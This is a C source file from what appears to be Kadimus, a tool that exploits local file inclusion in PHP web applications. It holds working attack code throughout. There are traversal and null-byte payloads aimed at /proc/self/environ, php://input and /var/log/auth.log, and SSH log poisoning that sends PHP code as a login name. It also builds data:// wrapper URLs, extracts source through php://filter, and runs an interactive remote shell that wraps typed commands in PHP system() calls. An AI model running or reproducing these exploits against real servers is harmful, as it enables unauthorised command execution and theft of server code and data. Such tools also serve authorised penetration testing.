#include "kadimus_xpl.h"

void build_rce_exploit(CURL *curl, const char *base_uri,
    struct parameter_list *plist, size_t pos, rce_type tech,
    const char *php_code);

char *build_datawrap_url(const char *base, struct parameter_list *plist,
    int p, const char *phpcode);

bool check_auth_poison(const char *target){
    char *php_code=NULL, r_str[R_SIZE], regex[VULN_SIZE],
    random_file[20], *mmap_str=NULL;
    int size_file, fd;
    bool ret = false;
    CURL *curl=NULL;
    FILE *x=NULL;

    if( (x = get_random_file(10, random_file)) == NULL)
        die("error while generate tmp file",0);

    curl = init_curl(NULL, false);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
    curl_easy_setopt(curl, CURLOPT_URL, target);

    random_string(r_str, R_SIZE);
    build_regex(regex, r_str, "Vulnerable");
    php_code = make_code(r_str, "<?php echo \"Vulnerable\"; ?>", true);

    build_rce_exploit(curl, NULL, NULL, 0, AUTH, php_code);

    if(HttpRequest(curl)){
        fflush(x);
        fclose(x);

        fd = readonly(random_file);

        size_file = get_file_size(fd);
        if(size_file){
            mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);

            if( !regex_match(AUTH_LOG_REGEX, mmap_str, size_file, PCRE_MULTILINE) )
                die("[-] be sure the file is /var/log/auth.log",0);

            if( regex_match(regex, mmap_str, size_file, 0) )
                ret = true;
        }
        close(fd);
    } else {
        die("[-] without connection",0);
    }

    curl_easy_cleanup(curl);
    xfree(php_code);

    unlink(random_file);
    return ret;

}

bool ssh_log_poison(const char *target, int port){
    ssh_session ssh_id;
    bool ret = false;

    ssh_id = ssh_new();

    if(ssh_id == NULL)
        return ret;

    ssh_options_set(ssh_id, SSH_OPTIONS_HOST, target);

    if(port)
        ssh_options_set(ssh_id, SSH_OPTIONS_PORT, &port);

    if(ssh_connect(ssh_id) != SSH_OK){
        printf("[-] failed to connect: %s\n", ssh_get_error(ssh_id));
    } else {
        if( ssh_userauth_password(ssh_id, STAIRWAY2HEAVEN, "AC/DC") == SSH_AUTH_ERROR )
            printf("[-] failed to send exploit\n");
        else
            ret = true;

        ssh_disconnect(ssh_id);
    }

    ssh_free(ssh_id);
    return ret;
}


void build_rce_exploit(CURL *curl, const char *base,
    struct parameter_list *plist, size_t pos, rce_type tech,
    const char *phpcode){
    char *cookieptr;
    char *data_wrap_uri;

    switch(tech){
        case INPUT:
        case AUTH:
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(phpcode));
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, phpcode);
        break;

        case ENVIRON:
            if(cookies){
                cookieptr = cookie_append(cookies, phpcode);
                curl_easy_setopt(curl, CURLOPT_COOKIE, cookieptr);
                free(cookieptr);
            } else {
                curl_easy_setopt(curl, CURLOPT_COOKIE, phpcode);
            }
        break;

        case DATA:
            data_wrap_uri = build_datawrap_url(base, plist, pos, phpcode);
            curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
            free(data_wrap_uri);
        break;
    }
}

char *build_datawrap_url(const char *base, struct parameter_list *plist, int p, const char *phpcode){
    char *b64, *xpl, *ret;
    size_t b64_len;

    b64 = b64encode(phpcode, strlen(phpcode));
    b64_len = strlen(b64);

    xpl = xmalloc(b64_len + DATAWRAPLEN + 1);

    memcpy(xpl, DATA_WRAP, DATAWRAPLEN);
    memcpy(xpl+DATAWRAPLEN, b64, b64_len);
    xpl[b64_len+DATAWRAPLEN] = 0x0;

    ret = build_url(base, plist, p, xpl, replace_string);

    free(b64);
    free(xpl);
    return ret;
}

bool check_error(const char *body){
    bool ret = false;
    char *line = NULL;
    size_t len = 0;
    ssize_t nread;

    FILE *fh = xfopen(ERROR_FILE, "r");

    while((nread = getline(&line, &len, fh)) != -1){
        if(nread <= 1)
            continue;

        if(line[nread-1] == '\n')
            line[nread-1] = 0x0;

        if(regex_match(line, body, 0, 0)){
            good_single("regex match: ( %s )\n", line);
            ret = true;
            break;
        }
    }


    fclose(fh);
    xfree(line);

    return ret;
}

int is_dynamic(const char *url){
    int result = 0;
    struct request body1, body2;

    CURL *ch1 = init_curl(&body1, true);
    CURL *ch2 = init_curl(&body2, true);


    curl_easy_setopt(ch1, CURLOPT_URL, url);
    curl_easy_setopt(ch2, CURLOPT_URL, url);

    init_str(&body1);
    init_str(&body2);


    if(!HttpRequest(ch1) || !HttpRequest(ch2)){
        result = -1;
        goto end;
    }

    if(body1.len == body2.len){
        if(strcmp(body1.ptr, body2.ptr) == 0){
            result = 0;

            if(check_error(body1.ptr))
                result = 2;
        }
        else
            result = 1;
    } else {
        result = 1;
    }

    end:
        curl_easy_cleanup(ch1);
        curl_easy_cleanup(ch2);
        xfree(body1.ptr);
        xfree(body2.ptr);

    return result;
}

int rce_scan(const char *base, struct parameter_list *plist, int p){

    static const char *environ_t[] = {
        "/proc/self/environ",
        "../../../../../../../../../../../proc/self/environ",
        "/proc/self/environ%00",
        "../../../../../../../../../../../proc/self/environ%00",
        NULL
    };

    static const char *input_t[] = {
        "php://input",
        "php://input%00",
        NULL
    };

    static const char *auth_t[] = {
        "/var/log/auth.log",
        "../../../../../../../../../../../var/log/auth.log",
        "/var/log/auth.log%00",
        "../../../../../../../../../../../var/log/auth.log%00",
        NULL
    };

    char random_str[R_SIZE], regex[VULN_SIZE],
    *php_code = NULL, *rce_uri = NULL;

    int size_file, fd;

    struct request body;
    size_t ret = 0, i = 0;

    FILE *auth_scan_file;

    CURL *curl = init_curl(&body, true);

    random_string(random_str, R_SIZE);
    build_regex(regex, random_str, "Vulnerable");
    php_code = make_code(random_str, "<?php echo 'Vulnerable'; ?>", false);

    info_single("testing php://input ...\n");
    for(i=0; input_t[i] != NULL; i++){
        init_str(&body);
        rce_uri = build_url(base, plist, p, input_t[i], replace_string);

        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
        build_rce_exploit(curl, NULL, NULL, 0, INPUT, php_code);
        info_single("requesting: %s\n", rce_uri);

        if(!HttpRequest(curl)){
            error_single("request error\n");
        } else {
            if(regex_match(regex, body.ptr, 0, 0)){
                print_thread("[RCE-INPUT] %s\n", rce_uri);
                good_single("target vulnerable: %s !!!\n", rce_uri);

                ret = 1;
                xfree(rce_uri);
                xfree(body.ptr);

                break;
            }
        }

        xfree(rce_uri);
        xfree(body.ptr);
    }

    if(!ret) warn_single("probably not vulnerable\n");
    info_single("php://input test finish\n");

    curl_easy_cleanup(curl);
    ret = 0;

    /* proc/self/environ test */
    info_single("testing /proc/self/environ ...\n");

    curl = init_curl(&body, true);

    for(i=0; environ_t[i]!=NULL; i++){
        init_str(&body);
        rce_uri = build_url(base, plist, p, environ_t[i], replace_string);
        info_single("requesting: %s\n", rce_uri);

        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
        build_rce_exploit(curl, NULL, NULL, 0, ENVIRON, php_code);

        if(!HttpRequest(curl)){
            error_single("request error\n");
        } else {
            if( regex_match(regex, body.ptr, 0, 0) ){
                print_thread("[RCE-ENVIRON] %s\n", rce_uri);
                good_single("target vulnerable !!!\n");

                ret = 1;
                xfree(body.ptr);
                xfree(rce_uri);

                break;
            }
        }

        xfree(body.ptr);
        xfree(rce_uri);
    }

    if(!ret) warn_single("probably not vulnerable\n");
    info_single("/proc/self/environ test finish\n");

    curl_easy_cleanup(curl);

    /* start wrap scanner */

    curl = init_curl(&body, true);
    init_str(&body);

    info_single("testing data wrap ...\n");

    char *datawrap = build_datawrap_url(base, plist, p, php_code);
    curl_easy_setopt(curl, CURLOPT_URL, datawrap);

    if(!HttpRequest(curl)){
        error_single("request error\n");
        //print_single("[-] Request error\n");
        //print_single("[-] probably not vulnerable\n");
    } else {
        if( regex_match(regex, body.ptr, 0, 0) ){

            print_thread("[RCE-DATA-WRAP] %s\n", datawrap);
            good_single("%s\n", datawrap);
            good_single("target vulnerable !!!\n");

        } else {
            warn_single("probably not vulnerable\n");
        }
    }

    info_single("data wrap test finish\n");

    curl_easy_cleanup(curl);
    xfree(body.ptr);
    free(datawrap);

    /* auth.log scan */
    //curl = init_curl(&body);

    curl = init_curl(NULL, false);
    ret = 0;

    info_single("testing /var/log/auth.log ...\n");
    char *mmap_str = NULL;
    //struct stat s;
    //int size_porra,fd;
    char random_file[20];

    for(i=0; auth_t[i]!=NULL; i++){
        rce_uri = build_url(base, plist, p, auth_t[i], replace_string);

        if( (auth_scan_file = get_random_file(10, random_file)) == NULL)
            die("error while generate tmp file",0);

        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)auth_scan_file);

        info_single("requesting: %s\n", rce_uri);
        if(!HttpRequest(curl)){
            error_single("request error\n");
        } else {
            fflush(auth_scan_file);
            fd = readonly(random_file);
            size_file = get_file_size(fd);

            if(size_file){
                mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);

                if( regex_match(AUTH_LOG_REGEX, mmap_str, size_file, PCRE_MULTILINE )){//PCRE_MULTILINE) ){//PCRE_MULTILINE) ){
                    print_thread("[RCE-AUTH-LOG] %s\n", rce_uri);
                    print_single("[~] %s\n", rce_uri);
                    print_single("[+] Vulnerable !!!\n");
                    ret = 1;
                }
            }
            close(fd);
        }


        fclose(auth_scan_file);
        unlink(random_file);
        xfree(rce_uri);
        if(ret) break;
    }

    if(!ret) warn_single("probably not vulnerable\n");
    info_single("/var/log/auth.log test finish\n");

    curl_easy_cleanup(curl);
    xfree(php_code);

    return 0;
}

void source_disclosure_get(const char *url, const char *filename, const char *pname, FILE *out){
    struct request body1, body2;
    struct parameter_list plist = {0};
    char *base, *url_filter, *filter, *content_diff;
    struct dynptr b64;
    size_t pos = 0;

    if(!get_element_pos(&plist, &base, url, pname, &pos)){
        error_single("parameter %s not found !!!\n", pname);
        return;
    }

    filter = xmalloc(strlen(filename)+sizeof(FILTER_WRAP));
    memcpy(filter, FILTER_WRAP, sizeof(FILTER_WRAP));
    strcat(filter, filename);

    url_filter = build_url(base, &plist, pos, filter, replace_string);

    free(filter);
    free(base);

    free(plist.trash);
    free(plist.parameter);

    CURL *ch1 = init_curl(&body1, true);
    CURL *ch2 = init_curl(&body2, true);

    init_str(&body1);
    init_str(&body2);

    curl_easy_setopt(ch1, CURLOPT_URL, url);
    curl_easy_setopt(ch2, CURLOPT_URL, url_filter);
    free(url_filter);

    info_single("trying get source code of file: %s\n", filename);

    if(!HttpRequest(ch1) || !HttpRequest(ch2))
        goto end;

    content_diff = diff(body1.ptr, body2.ptr);

    if(!content_diff){
        error_single("cannot detect base64 output\n");
        goto end;
    }

    trim_string(&content_diff);

    if(b64decode(content_diff, &b64)){
        good_single("valid base64 returned:\n");
        if(out){
            fwrite(b64.ptr, b64.len, 1, out);
            fclose(out);
            info_single("check the output file\n");
        } else {
            fwrite(b64.ptr, b64.len, 1, stdout);
        }
        printf("\n");
        free(b64.ptr);
    } else {
        error_single("invalid base64 detected\n");
        info_single("try use null byte poison, or set filename without extension\n");
    }

    free(content_diff);

    end:
    curl_easy_cleanup(ch1);
    curl_easy_cleanup(ch2);
    free(body1.ptr);
    free(body2.ptr);
}

int check_files(char *base, struct parameter_list *plist, int p){
    char *line = NULL, *file, *regex, *file_uri = NULL;
    struct request body;
    int result = 0;
    size_t n = 0;
    ssize_t nread;

    FILE *fh = xfopen(CHECK_FILES, "r");
    CURL *ch = init_curl(&body, true);

    while((nread = getline(&line, &n, fh)) != -1){
        if(nread < 3 || line[0] == '#' || line[0] == ':')
            continue;

        if(line[nread-1] == '\n')
            line[nread-1] = 0x0;


        file = line;
        regex = strchr(line, ':');
        if(!regex)
            continue;

        *regex = 0;
        regex++;

        if(regex[0] == 0x0)
            continue;

        init_str(&body);

        file_uri = build_url(base, plist, p, file, replace_string);
        curl_easy_setopt(ch, CURLOPT_URL, file_uri);

        info_single("requesting: %s\n", file_uri);

        if(!HttpRequest(ch)){
            error_single("no connection with the target URL, exiting ...\n");
        } else {
            if(regex_match(regex, body.ptr, body.len, 0)){
                print_thread("[FILE] %s | (%s)\n", file_uri, regex);
                //print_single("[~] %s\n", file_uri);
                good_single("regex match: %s\n", regex);
                good_single("check the url: %s\n", file_uri);
            }
        }

        xfree(body.ptr);
        xfree(file_uri);
    }

    xfree(line);
    fclose(fh);
    curl_easy_cleanup(ch);

    return result;
}

void exec_phpcode(const char *url, const char *parameter, const char *code, int type){
    char *base = NULL, *rce_code, rbuf[8], regex[M_ALL_SIZE];
    struct parameter_list plist = {0};
    struct curl_slist *chunk = NULL;

    void *plistptr = NULL;
    struct request body;
    char **match = NULL;
    CURL *curl;
    size_t pos;
    int len = 0;

    init_str(&body);
    curl = init_curl(&body, true);

    info_single("trying exec code ...\n");

    if(type == DATA){
        if(!get_element_pos(&plist, &base, url, parameter, &pos)){
            error_single("[-] Parameter: %s not found !!!\n", parameter);

            curl_easy_cleanup(curl);
            free(body.ptr);

            return;
        }

        plistptr = &plist;
    } else {
        curl_easy_setopt(curl, CURLOPT_URL, url);
    }

    chunk = curl_slist_append(chunk, "Connection: close");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);

    rce_code = make_code(random_string(rbuf, sizeof(rbuf)), code, (type == AUTH));
    build_rce_exploit(curl, base, plistptr, pos, type, rce_code);

    build_regex(regex, rbuf, "(.*)");

    if(HttpRequest(curl)){
        match = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
    }

    info_single("result: \n");

    if(len > 0){
        printf("\n%s\n\n", match[0]);
        regex_free(match);
    } else {
        error_single("nothing to show !\n");
    }

    info_single("finish\n");

    free(body.ptr);
    free(rce_code);
    curl_easy_cleanup(curl);
    curl_slist_free_all(chunk);
}

void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
    char cmd[1000], ran_str[R_SIZE],
    **regex_data = NULL, regex[M_ALL_SIZE], *base_uri = NULL;
    char *aux=NULL;
    char *php_code, random_file[20], *mmap_str;
    // php_code[1000+R_SIZE+R_SIZE+23],
    struct parameter_list plist={0};
    size_t inject_index = 0;
    struct request body;
    ssize_t nbytes = 0;
    FILE *x=NULL;
    int len = 0, aux_len=0,fd,size_file;

    CURL *curl=NULL;

    if(tech != AUTH){
        curl = init_curl(&body, true);
    } else {
        curl = init_curl(NULL, false);
    }

    if(tech != DATA){
        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
    } else {
        if(!get_element_pos(&plist, &base_uri, rce_uri, p_name, &inject_index)){
            printf("[-] Parameter: %s not found !!!\n",p_name);
            curl_easy_cleanup(curl);
            return;
        }

    }

    random_string(ran_str, R_SIZE);
    build_regex(regex, ran_str, "(.*)");

    while(1){
        printf("(kadimus~shell)> ");
        fflush(stdout);

        nbytes = read(0, cmd, sizeof(cmd)-1);
        if(!nbytes) break;

        if(cmd[nbytes-1] == '\n')
            cmd[nbytes-1] = 0x0;
        else
            cmd[nbytes] = 0x0;

        if(!cmd[0])
            continue;

        if(!strcmp(cmd, "exit"))
            break;

        aux_len = 29+nbytes;
        aux = xmalloc( aux_len );
        snprintf(aux, aux_len, "<?php system(\"%s\"); ?>", cmd );
        php_code = make_code(ran_str, aux, (tech == AUTH) ? true : false);
        xfree(aux);

        if(tech != AUTH){
            init_str(&body);
        } else {
            if( (x = get_random_file(10, random_file))== NULL )
                die("error while generate random file",0);

            curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
        }

        if(tech == INPUT)
            build_rce_exploit(curl, NULL, NULL, 0, INPUT, php_code);

        else if(tech == ENVIRON)
            build_rce_exploit(curl, NULL, NULL, 0, ENVIRON, php_code);

        else if(tech == DATA)
            build_rce_exploit(curl, base_uri, &plist, inject_index, DATA, php_code);

        else if(tech == AUTH)
            build_rce_exploit(curl, NULL, NULL, 0, AUTH, php_code);

        if(HttpRequest(curl)){
            if(tech == AUTH){
                fflush(x);
                fclose(x);
                fd = readonly(random_file);
                size_file = get_file_size(fd);
                mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
                regex_data = regex_extract(regex, mmap_str, size_file, PCRE_DOTALL, &len);
                close(fd);
            }

            else {
                regex_data = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
            }

            if(len > 0) {
                printf("%s",regex_data[0]);
                regex_free(regex_data);
            }

        }

        if(tech != AUTH){
            xfree(body.ptr);
        } else {
            unlink(random_file);
        }

        xfree(php_code);
    }

    if(tech == DATA){
        xfree(base_uri);
        free(plist.trash);
        free(plist.parameter);
    }

    curl_easy_cleanup(curl);
}

int common_error_check(const char *uri){
    int result = 0;
    struct request body;
    CURL *ch = init_curl(&body, true);

    init_str(&body);

    curl_easy_setopt(ch, CURLOPT_URL, uri);

    if(!HttpRequest(ch)){
        result = -1;
    } else {
        if(check_error(body.ptr))
            result = 1;
    }

    curl_easy_cleanup(ch);
    xfree(body.ptr);
    return result;
}

int disclosure_check(const char *uri, const char *xuri){
    struct request body1, body2;
    struct dynptr b64decoded;
    char *b64 = NULL;
    int result = 0;

    CURL *ch1 = init_curl(&body1, true);
    CURL *ch2 = init_curl(&body2, true);

    init_str(&body1);
    init_str(&body2);

    curl_easy_setopt(ch1, CURLOPT_URL, uri);
    curl_easy_setopt(ch2, CURLOPT_URL, xuri);

    if(!HttpRequest(ch1) || !HttpRequest(ch2)){
        result = -1;
        goto end;
    }

    b64 = diff(body1.ptr, body2.ptr);

    if(!b64)
        goto end;

    trim_string(&b64);

    if(b64decode(b64, &b64decoded)){
        result = 1;

        if(!thread_on){
            good_all("target probably vulnerable\n");
            hex_print(b64decoded.ptr);
            print_all("\n");
        }

        free(b64decoded.ptr);
    }

    free(b64);

    end:
        curl_easy_cleanup(ch1);
        curl_easy_cleanup(ch2);
        free(body1.ptr);
        free(body2.ptr);

    return result;
}

void scan(const char *target_uri){
    char *base_uri = NULL, *parameters = NULL;
    char *source_disc = NULL, *error_uri = NULL;
    char random_str[R_SIZE];

    int result = 0;
    size_t i = 0;
    bool dynamic = false, previous_error = false;
    struct parameter_list plist = { .len = 0, .parameter = 0, .trash = 0};

    extract_url(target_uri, &base_uri, &parameters);

    if(!base_uri || !parameters)
        goto end;

    tokenize(parameters, &plist);
    xfree(parameters);


    info_all("starting scanning the URL: %s\n", target_uri);
    info_all("testing if URL have dynamic content ...\n");
    result = is_dynamic(target_uri);

    if(result == -1){
        error_all("no connection with the target URL, exiting ...\n");
        goto end;
    }

    else if(result == 0 || result == 2){
        info_all("URL dont have dynamic content\n");
        dynamic = false;
    }

    else if(result == 1){
        warn_all("URL have dynamic content\n");
        warn_all("skipping source disclosure test\n");
        dynamic = true;
    }

    if(result == 2){
        good_all("common error found, common error checking will be skipped\n");
        previous_error = true;
    }

    for(i=0; i<plist.len; i++){
        if(!plist.parameter[i].key[0])
            continue;

        info_all("analyzing '%s' parameter ...\n", plist.parameter[i].key);

        if(!previous_error && plist.parameter[i].value){
            info_all("checking for common error messages\n");
            error_uri = build_url(base_uri, &plist, i, random_string(random_str, R_SIZE), replace_string);
            info_all("using random url: %s\n",error_uri);
            result = common_error_check(error_uri);

            if(result == -1){
                goto end;
            }

            else if(result == 1){
                info_all("error found !!!\n");
            }

            else {
                warn_all("no errors found\n");
            }

            xfree(error_uri);
        }

        if(!dynamic && plist.parameter[i].value){
            info_all("starting source disclosure test ...\n");

            source_disc = build_url(base_uri, &plist, i, FILTER_WRAP, append_before);
            result = disclosure_check(target_uri, source_disc);

            if(result == -1)
                goto end;
            else if(result == 1){

            } else {
                warn_all("parameter does not seem vulnerable to source disclosure\n");
            }

            xfree(source_disc);
        }

        info_all("checking common files ...\n");
        check_files(base_uri, &plist, i);
        info_all("common files check finished\n");

        info_all("checking for RCE ...\n");
        rce_scan(base_uri, &plist, i);
        info_all("RCE check finished\n");


    }

    end:
        free(plist.trash);
        free(plist.parameter);
        xfree(base_uri);
        xfree(parameters);
        xfree(error_uri);
        xfree(source_disc);

        info_all("scan finish !!!\n\n");
        return;

}

void *thread_scan(void *url){
    char *target_uri = ((char *) url);
    char *base_uri = NULL, *parameters = NULL;
    char *source_disc = NULL, *error_uri = NULL;
    char random_str[R_SIZE];
    struct parameter_list plist = { .len = 0, .parameter = 0, .trash = 0};

    int result = 0;
    size_t i = 0;
    bool dynamic = false, previous_error = false;

    extract_url(target_uri, &base_uri, &parameters);

    if(!base_uri || !parameters)
        goto end;

    tokenize(parameters, &plist);
    xfree(parameters);

    printf("[SCANNING] %s\n",target_uri);
    result = is_dynamic(target_uri);

    if(result == -1)
        goto end;

    else if(result == 0)
        dynamic = false;

    else if(result == 1)
        dynamic = true;

    else if(result == 2){
        dynamic = false;
        previous_error = true;
        print_thread("[PREV-LFI-ERROR] %s\n",target_uri);
    }

    for(i=0; i <plist.len; i++){
        if(!plist.parameter[i].key[0])
            continue;

        if(!previous_error && plist.parameter[i].value){
            error_uri = build_url(base_uri, &plist, i, random_string(random_str, R_SIZE), replace_string);
            result = common_error_check(error_uri);

            //if(result == -1)
            //    goto end;
            if(result == 1)
                print_thread("[COMMON-LFI-ERROR] %s\n",error_uri);

            xfree(error_uri);
        }

        if(!dynamic && plist.parameter[i].value){
            source_disc = build_url(base_uri, &plist, i, FILTER_WRAP, append_before);
            result = disclosure_check(target_uri, source_disc);

            //if(result == -1)
            //    goto end;
            if(result == 1)
                print_thread("[RSD] %s | %s\n", target_uri, plist.parameter[i].key);

            xfree(source_disc);

        }

        check_files(base_uri, &plist, i);
        rce_scan(base_uri, &plist, i);

    }

    end:
        free(plist.trash);
        free(plist.parameter);

        xfree(target_uri);
        xfree(base_uri);
        xfree(parameters);
        //xfree(error_uri);
        //xfree(source_disc);


    return (void *)0;
}
